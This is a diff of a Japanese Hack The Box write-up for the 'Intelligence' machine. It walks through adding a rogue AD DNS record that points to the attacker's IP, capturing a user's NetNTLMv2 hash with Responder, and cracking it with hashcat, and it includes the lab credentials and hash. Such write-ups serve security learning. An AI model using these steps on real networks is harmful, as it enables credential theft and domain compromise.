@@ -280,9 +280,11 @@ step2でitフォルダも読み取り可能であることを確認
 
 └─$ smbget -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' smb://10.129.95.154/IT/downdetector.ps1                  
 Using domain: INTELLIGENCE.HTB, user: Tiffany.Molina
-smb://10.129.95.154/IT/downdetector.ps1                                                                                                                                
+smb://10.129.95.154/IT/downdetector.ps1 
 Downloaded 1.02kB in 7 seconds
 ```
+webから始まるdnsレコード名に対してinvoke-webrequestを実行  
+またコマンドには、ユーザのクレデンシャルを使用するオプションが使用されていることを確認
 ```powershell
 └─$ cat downdetector.ps1 
 ��# Check web server status. Scheduled to run every 5min
@@ -296,3 +298,161 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 } catch {}
 }
 ```
+activedirectoryはdnsとしてadidnsを使用できるが、adidnsのデフォルトではどのユーザでもdnsレコードが作成可能である。[リンク](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)  
+ldap上では、「DC=DomainDnsZones,DC=intelligence,DC=htb」にバインディングするとdnsレコードが確認できる  
+(godapではバインディング先を指定しなくとも、adidnsタブで自動表示してくれる)    
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Intelligence_03.png">  
+またadidnsdumpというツールでも確認できる
+```sh
+└─$ python3.13 adidnsdump/dnsdump.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --print-zones 10.129.95.154 
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Found 2 domain DNS zones:
+    intelligence.htb
+    RootDNSServers
+[-] Found 1 forest DNS zones (dump with --forest):
+    _msdcs.intelligence.htb
+[-] Found 1 legacy DNS zones (dump with --legacy):
+    RootDNSServers
+
+└─$ python3.13 adidnsdump/dnsdump.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.129.95.154  
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Querying zone for records
+[+] Found 8 records, saving to records.csv
+
+└─$ cat records.csv 
+type,name,value
+?,ForestDnsZones,?
+?,DomainDnsZones,?
+AAAA,dc,dead:beef::85e8:f613:63b0:9e75
+A,dc,10.129.95.154
+NS,_msdcs,dc.intelligence.htb.
+AAAA,@,dead:beef::85e8:f613:63b0:9e75
+NS,@,dc.intelligence.htb.
+A,@,10.129.95.154
+```
+仮に先ほどのpowershellスクリプトが実行された場合、攻撃者のipに対応したdnsレコードにwebアクセス -> 攻撃者のhttpサーバ上でクレデンシャル窃取が可能である  
+ということで、krbrelayxツールを使用してdnsレコード追加
+```sh
+└─$ python3.13 krbrelayx/dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r web01 -d 10.10.16.33 10.129.95.154
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+
+└─$ python3.13 krbrelayx/dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a query -r web01 10.129.95.154          
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found record web01
+DC=web01,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
+[+] Record entry:
+ - Type: 1 (A) (Serial: 113)
+ - Address: 10.10.16.33
+
+
+# ちなみにbloodyadでも追加できる
+└─$ bloodyAD -d intelligence.htb -u tiffany.molina -p NewIntelligenceCorpUser9876 --host 10.129.95.154 add dnsRecord web01 10.10.16.33
+[+] web01 has been successfully added
+```
+powershellスクリプト経由のwebリクエストを受信！  
+ted.gravesのntlmv2チャレンジを取得
+```sh
+└─$ sudo responder -I tun0 -v
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.33]
+    Responder IPv6             [dead:beef:4::101f]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-MFNRPD6EEHX]
+    Responder Domain Name      [Z08L.LOCAL]
+    Responder DCE-RPC Port     [46357]
+
+[*] Version: Responder 3.1.7.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+[*] To sponsor Responder: https://paypal.me/PythonResponder
+
+[+] Listening for events...                                                                                                                                                
+
+[HTTP] Sending NTLM authentication request to 10.129.95.154
+[HTTP] GET request from: ::ffff:10.129.95.154  URL: / 
+[HTTP] NTLMv2 Client   : 10.129.95.154
+[HTTP] NTLMv2 Username : intelligence\Ted.Graves
+[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:3a4b4b0205562e23:6C5A2543D767342E8C900226A95407B5:010100000000000068BCE54C585EDC0199A62B61466ED78300000000020008005A00300038004C0001001E00570049004E002D004D0046004E0052005000440036004500450048005800040014005A00300038004C002E004C004F00430041004C0003003400570049004E002D004D0046004E00520050004400360045004500480058002E005A00300038004C002E004C004F00430041004C00050014005A00300038004C002E004C004F00430041004C00080030003000000000000000000000000020000005502C95DBE967A3B38620F3F7E21436C2D8ECCC806B8965750BCAD55C1BFBD40A001000000000000000000000000000000000000900360048005400540050002F00770065006200300031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+```
+クラック成功！  
+パスワードはMr.Teddy
+```sh
+└─$ name-that-hash -f ted.graves.txt --no-banner                                
+
+Ted.Graves::intelligence:3a4b4b0205562e23:6C5A2543D767342E8C900226A95407B5:010100000000000068BCE54C585EDC0199A62B61466ED78300000000020008005A00300038004C0001001E005700
+49004E002D004D0046004E0052005000440036004500450048005800040014005A00300038004C002E004C004F00430041004C0003003400570049004E002D004D0046004E00520050004400360045004500480
+058002E005A00300038004C002E004C004F00430041004C00050014005A00300038004C002E004C004F00430041004C00080030003000000000000000000000000020000005502C95DBE967A3B38620F3F7E214
+36C2D8ECCC806B8965750BCAD55C1BFBD40A001000000000000000000000000000000000000900360048005400540050002F00770065006200300031002E0069006E00740065006C006C006900670065006E006
+30065002E006800740062000000000000000000
+
+Most Likely 
+NetNTLMv2, HC: 5600 JtR: netntlmv2
+
+└─$ hashcat -a 0 -m 5600 ted.graves.txt /usr/share/wordlists/rockyou.txt --quiet
+TED.GRAVES::intelligence:3a4b4b0205562e23:6c5a2543d767342e8c900226a95407b5:010100000000000068bce54c585edc0199a62b61466ed78300000000020008005a00300038004c0001001e00570049004e002d004d0046004e0052005000440036004500450048005800040014005a00300038004c002e004c004f00430041004c0003003400570049004e002d004d0046004e00520050004400360045004500480058002e005a00300038004c002e004c004f00430041004c00050014005a00300038004c002e004c004f00430041004c00080030003000000000000000000000000020000005502c95dbe967a3b38620f3f7e21436c2d8eccc806b8965750bcad55c1bfbd40a001000000000000000000000000000000000000900360048005400540050002f00770065006200300031002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
+```
+
+
+## STEP 4
